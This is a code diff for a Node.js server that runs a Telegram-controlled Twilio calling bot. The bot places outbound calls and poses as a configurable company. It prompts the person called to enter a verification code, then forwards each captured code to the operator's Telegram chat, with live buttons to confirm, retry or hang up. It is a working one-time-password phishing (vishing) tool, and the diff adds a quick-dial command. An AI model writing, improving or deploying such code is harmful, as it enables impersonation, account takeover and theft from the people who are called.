@@ -1,7 +1,6 @@
 const express=require("express")
 const bodyParser=require("body-parser")
 const fetch=require("node-fetch")
-const twilio=require("twilio")
 
 const app=express()
 app.use(bodyParser.urlencoded({extended:false}))
@@ -12,13 +11,15 @@ const PORT=process.env.PORT||3000
 const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
 const CHAT_ID=process.env.CHAT_ID
 
-const TWILIO_ACCOUNT_SID=process.env.TWILIO_ACCOUNT_SID
-const TWILIO_AUTH_TOKEN=process.env.TWILIO_AUTH_TOKEN
+const TWILIO_SID=process.env.TWILIO_SID
+const TWILIO_TOKEN=process.env.TWILIO_TOKEN
 const TWILIO_NUMBER=process.env.TWILIO_NUMBER
 
 const BASE_URL=process.env.BASE_URL
 
-const client=twilio(TWILIO_ACCOUNT_SID,TWILIO_AUTH_TOKEN)
+function auth(){
+return "Basic "+Buffer.from(`${TWILIO_SID}:${TWILIO_TOKEN}`).toString("base64")
+}
 
 /* SETTINGS */
 
@@ -44,7 +45,6 @@ let activeCaller=null
 let activeCode=null
 let callStart=null
 let lastCaller=null
-let callStatus="Idle"
 
 let logs=[]
 
@@ -82,23 +82,13 @@ function panelText(){
 
 let status="No active call"
 
-if(callStatus==="Ringing"){
+if(activeCallSid){
 let secs=Math.floor((Date.now()-callStart)/1000)
-status=`📞 Ringing
-Number: ${activeCaller}
+
+status=`Active call
+Caller: ${activeCaller}
+Code: ${activeCode||"waiting"}
 Time: ${secs}s`
-}
-
-if(callStatus==="Answered"){
-let secs=Math.floor((Date.now()-callStart)/1000)
-status=`✅ Answered
-Number: ${activeCaller}
-Time: ${secs}s
-Code: ${activeCode||"waiting"}`
-}
-
-if(callStatus==="Ended"){
-status=`❌ Call Ended`
 }
 
 return `📞 IVR Control Panel
@@ -120,7 +110,8 @@ return[
 {text:"⛔ Hang Up",callback_data:"hangup"}
 ],
 [
-{text:"📞 Call Last",callback_data:"calllast"}
+{text:"📞 Call Last",callback_data:"calllast"},
+{text:"📲 Call",callback_data:"call"}
 ],
 [
 {text:"📊 Status",callback_data:"status"},
@@ -164,12 +155,6 @@ res.send("Server running")
 
 app.post("/ivr",(req,res)=>{
 
-callStatus="Ringing"
-activeCaller=req.body.From
-callStart=Date.now()
-
-updatePanel()
-
 res.type("text/xml")
 
 res.send(`
@@ -193,7 +178,6 @@ const sid=req.body.CallSid
 activeCallSid=sid
 activeCaller=caller
 activeCode=digits
-callStatus="Answered"
 callStart=Date.now()
 
 lastCaller=caller
@@ -212,16 +196,12 @@ Please wait while we verify your code.
 </Response>
 `)
 
-setTimeout(async()=>{
-
 await tgSend(`📞 CODE RECEIVED
 
 Caller: ${caller}
 Code: ${digits}`)
 
 updatePanel()
-
-},0)
 
 })
 
@@ -245,14 +225,22 @@ app.post("/telegram",async(req,res)=>{
 
 const update=req.body
 
+/* BUTTONS */
+
 if(update.callback_query){
 
 const action=update.callback_query.data
 
 if(action==="confirm"){
 
-await client.calls(activeCallSid).update({
-twiml:`
+await fetch(`https://api.twilio.com/2010-04-01/Accounts/${TWILIO_SID}/Calls/${activeCallSid}.json`,{
+method:"POST",
+headers:{
+Authorization:auth(),
+"Content-Type":"application/x-www-form-urlencoded"
+},
+body:new URLSearchParams({
+Twiml:`
 <Response>
 <Say voice="${assistants[settings.assistant].voice}">
 Thank you. Your code has been confirmed. Have a great day.
@@ -261,10 +249,11 @@ Thank you. Your code has been confirmed. Have a great day.
 </Response>
 `
 })
+})
 
-callStatus="Ended"
 activeCallSid=null
 activeCode=null
+callStart=null
 
 updatePanel()
 
@@ -272,8 +261,14 @@ updatePanel()
 
 if(action==="retry"){
 
-await client.calls(activeCallSid).update({
-twiml:`
+await fetch(`https://api.twilio.com/2010-04-01/Accounts/${TWILIO_SID}/Calls/${activeCallSid}.json`,{
+method:"POST",
+headers:{
+Authorization:auth(),
+"Content-Type":"application/x-www-form-urlencoded"
+},
+body:new URLSearchParams({
+Twiml:`
 <Response>
 <Say voice="${assistants[settings.assistant].voice}">
 Please re-enter your code.
@@ -281,6 +276,7 @@ Please re-enter your code.
 <Gather numDigits="${settings.digits}" action="${BASE_URL}/code"/>
 </Response>
 `
+})
 })
 
 activeCode=null
@@ -290,14 +286,20 @@ updatePanel()
 
 if(action==="hangup"){
 
-await client.calls(activeCallSid).update({
-twiml:`<Response><Hangup/></Response>`
+await fetch(`https://api.twilio.com/2010-04-01/Accounts/${TWILIO_SID}/Calls/${activeCallSid}.json`,{
+method:"POST",
+headers:{
+Authorization:auth(),
+"Content-Type":"application/x-www-form-urlencoded"
+},
+body:new URLSearchParams({
+Twiml:`<Response><Hangup/></Response>`
 })
-
-callStatus="Ended"
+})
 
 activeCallSid=null
 activeCode=null
+callStart=null
 
 updatePanel()
 
@@ -305,6 +307,10 @@ updatePanel()
 
 if(action==="calllast"){
 startCall(lastCaller)
+}
+
+if(action==="call"){
+tgSend("Use /call +number to dial")
 }
 
 if(action==="status"){
@@ -330,6 +336,21 @@ if(update.message){
 
 const text=update.message.text
 
+if(text.startsWith("/call")){
+
+const number=text.split(" ")[1]
+
+if(!number){
+tgSend("Usage: /call +447xxxxxxxx")
+return
+}
+
+startCall(number)
+
+tgSend(`📞 Calling ${number}`)
+
+}
+
 if(text.startsWith("/digits")){
 
 const d=parseInt(text.split(" ")[1])
@@ -348,24 +369,9 @@ const a=parseInt(text.split(" ")[1])
 
 if(a>=1 && a<=assistants.length){
 settings.assistant=a-1
-tgSend(`🤖 ${assistants[a-1].name} assistant set`)
+tgSend(`🎙 Assistant ${a} set`)
 updatePanel()
 }
-
-}
-
-if(text.startsWith("/call")){
-
-const number=text.split(" ")[1]
-
-if(!number){
-tgSend("Usage: /call +447xxxxxxxx")
-return
-}
-
-startCall(number)
-
-tgSend(`📞 Calling ${number}`)
 
 }
 
@@ -374,7 +380,6 @@ if(text.startsWith("/company")){
 settings.company=text.replace("/company ","")
 
 tgSend(`🏢 Company set to ${settings.company}`)
-
 updatePanel()
 
 }
@@ -384,40 +389,29 @@ panelMessageId=null
 updatePanel()
 }
 
-if(text==="/commands"){
-
-tgSend(`⚙ Commands
-
-/digits X → set digits
-/assistant X → set assistant
-/company NAME → set company
-/panel → open control panel
-/status → refresh panel
-/logs → show last codes
-
-Current:
-${settings.digits} digits set
-Assistant: ${assistants[settings.assistant].name}
-Company: ${settings.company}`)
-
-}
-
 }
 
 res.sendStatus(200)
 
 })
 
-/* START CALL */
+/* OUTBOUND CALL */
 
 async function startCall(number){
 
 if(!number)return
 
-await client.calls.create({
-url:`${BASE_URL}/ivr`,
-to:number,
-from:TWILIO_NUMBER
+await fetch(`https://api.twilio.com/2010-04-01/Accounts/${TWILIO_SID}/Calls.json`,{
+method:"POST",
+headers:{
+Authorization:auth(),
+"Content-Type":"application/x-www-form-urlencoded"
+},
+body:new URLSearchParams({
+From:TWILIO_NUMBER,
+To:number,
+Url:`${BASE_URL}/ivr`
+})
 })
 
 }
